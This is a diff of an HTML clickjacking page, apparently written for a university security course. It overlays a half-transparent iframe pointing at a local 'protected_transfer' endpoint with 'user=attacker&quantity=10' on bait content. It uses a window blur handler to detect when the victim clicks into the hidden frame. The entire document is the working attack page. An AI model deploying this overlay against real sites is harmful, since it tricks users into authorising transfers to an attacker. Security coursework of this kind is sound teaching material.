@@ -2,7 +2,7 @@
 <head>
 <style>
 #parentDiv { position:relative; }
-#childDiv { position:absolute; left:-25px; top:-170px; opacity: 0.5; }
+#childDiv { position:absolute; left:0px; top:0px; opacity: 0.5; }
 p    {color:red;font-family:courier;font-size:160%;}
 </style>
 <script>
@@ -20,17 +20,15 @@ document.getElementById("second").focus();
 <script>
 var fr = document.getElementById("parentDiv");
 window.onblur = blurText;
-
 function blurText() {
 //alert("blur event detected!");
  setTimeout(function(){
-    document.location="http://pages.cs.wisc.edu/~rist/642-fall-2014/.";
+    //document.location="http://pages.cs.wisc.edu/~rist/642-fall-2014/.";
 }, 5000);
    // remove the event to stop an infinite loop!
   window.onblur = '';
   gamePlay();
 }
-
 function gamePlay()
 {
 var para = document.createElement("p");
@@ -41,5 +39,5 @@ element.appendChild(para);
 }
 </script>
 </body>
-<iframe sandbox="allow-scripts allow-forms" id="childDiv" width="75px" height="185px" scrolling="no" src="http://128.105.175.15:3000/protected_transfer#main"></iframe>
+<iframe sandbox="allow-scripts allow-forms" id="childDiv" width="75px" height="500px" scrolling="no" src="http://localhost:3000/protected_transfer#main?user=attacker&quantity=10"></iframe>
 </html>
